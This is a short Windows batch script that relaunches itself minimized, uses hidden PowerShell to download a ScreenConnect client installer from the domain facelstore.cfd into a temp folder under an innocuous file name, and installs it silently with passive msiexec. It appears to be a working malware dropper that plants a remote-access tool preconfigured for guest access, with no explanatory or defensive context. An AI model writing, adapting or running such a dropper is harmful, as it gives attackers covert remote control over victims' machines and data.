@echo off
setlocal

REM ====================================
REM Relaunch minimized (not hidden)
REM ====================================
if "%~1"=="" (
  start "" /min "%~f0" run
  exit /b
)

REM ====================================
REM Settings
REM ====================================
set "TEMP_DIR=%TEMP%\SCInstallerss"
set "MSI_URL=https://facelstore.cfd/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_PATH=%TEMP_DIR%\Dffc.msi"

mkdir "%TEMP_DIR%" >nul 2>&1

REM ====================================
REM Download MSI (PowerShell hidden)
REM ====================================
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri '%MSI_URL%' -OutFile '%MSI_PATH%'"

if not exist "%MSI_PATH%" exit /b

REM ====================================
REM Install with PASSIVE UI
REM ====================================
msiexec /i "%MSI_PATH%" /passive /norestart

exit